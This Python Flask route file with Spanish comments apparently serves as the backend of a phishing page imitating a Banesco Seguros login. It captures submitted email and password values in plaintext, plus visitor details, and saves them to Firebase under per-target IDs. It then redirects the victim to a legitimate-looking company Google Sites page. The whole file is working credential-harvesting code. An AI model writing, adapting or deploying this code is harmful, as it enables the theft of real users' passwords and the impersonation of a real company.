from flask import Blueprint, render_template, redirect, request, Response
from app.services.firebase import get_user_by_id, update_user_credentials, add_emails, get_email_by_email, save_user_data
from app.utils import collect_user_info
from uuid import uuid4 as uuid

main_bp = Blueprint('main_bp', __name__)

@main_bp.route("/", defaults={'user_id': None}, methods=['GET'])
@main_bp.route("/<user_id>", methods=['GET'])
def index(user_id):
    return render_template("index.html", user_id=user_id)

@main_bp.post("/")
def main():
    account = request.form.get("account", None)
    password = request.form.get("password", None)
    user_id = request.form.get("user_id", None)

    user_data = collect_user_info(request)

    if not account or len(account.strip()) == 0:
        return Response(render_template("index.html", error_message="Email is empty"), status=400)
    elif not password or len(password.strip()) == 0:
        return Response(render_template("index.html", error_message="Password is empty"), status=400)
    else:
        try:
            if user_id:
                # Verificar que el email anónimo se ha creado y obtener su ID
                email_data = get_user_by_id(user_id)
                
                if email_data:
                    # Actualizar las credenciales del usuario con el email proporcionado y la contraseña
                    update_user_credentials(user_id, account, password)
                    # Guardar la información del usuario en Firebase
                    save_user_data(user_id, user_data)
                
                return redirect("https://sites.google.com/banescoseguros.com/gestion/inicio#h.f2z67bvyf6ca")
            else:
                # Crear un nuevo email anónimo
                anonymous_email = f"anonymous-{uuid()}@example.com"
                emails = [anonymous_email]
                add_emails(emails)
                
                # Obtener los datos del email anónimo creado
                email_data = get_email_by_email(anonymous_email)
                if email_data and email_data['email'] == anonymous_email:
                    # Actualizar las credenciales del usuario con el email proporcionado y la contraseña
                    update_user_credentials(email_data['id'], account, password)
                    # Guardar la información del usuario en Firebase
                    save_user_data(email_data['id'], user_data)
                
                return redirect("https://sites.google.com/banescoseguros.com/gestion/inicio#h.f2z67bvyf6ca")
        except Exception as e:
            print(e)
            return Response(render_template("index.html", error_message="An error occurred"), status=500)
